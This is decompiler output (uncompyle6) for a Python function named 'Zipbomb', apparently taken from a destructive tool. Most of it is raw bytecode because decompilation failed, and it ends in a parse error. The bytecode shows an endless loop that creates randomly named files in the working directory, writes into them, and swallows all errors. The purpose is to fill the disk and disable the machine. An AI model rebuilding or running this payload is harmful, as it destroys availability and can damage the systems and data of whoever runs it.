# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: Core\Bomb\ZipBomb.py
import os, random

def Zipbomb--- This code section failed: ---

 L.  11         0  SETUP_FINALLY        46  'to 46'

 L.  12         2  LOAD_GLOBAL              str
                4  LOAD_GLOBAL              random
                6  LOAD_METHOD              random
                8  CALL_METHOD_0         0  ''
               10  CALL_FUNCTION_1       1  ''
               12  STORE_FAST               'Random'

 L.  13        14  LOAD_GLOBAL              open
               16  LOAD_GLOBAL              os
               18  LOAD_METHOD              getcwd
               20  CALL_METHOD_0         0  ''
               22  LOAD_STR                 '\\'
               24  BINARY_ADD       
               26  LOAD_FAST                'Random'
               28  BINARY_ADD       
               30  LOAD_STR                 'a'
               32  CALL_FUNCTION_2       2  ''
               34  LOAD_METHOD              write
               36  LOAD_FAST                'Random'
               38  CALL_METHOD_1         1  ''
               40  POP_TOP          
               42  POP_BLOCK        
               44  JUMP_BACK             0  'to 0'
             46_0  COME_FROM_FINALLY     0  '0'

 L.  14        46  POP_TOP          
               48  POP_TOP          
               50  POP_TOP          

 L.  15        52  POP_EXCEPT       
               54  JUMP_BACK             0  'to 0'
               56  <48>             
               58  JUMP_BACK             0  'to 0'

Parse error at or near `<48>' instruction at offset 56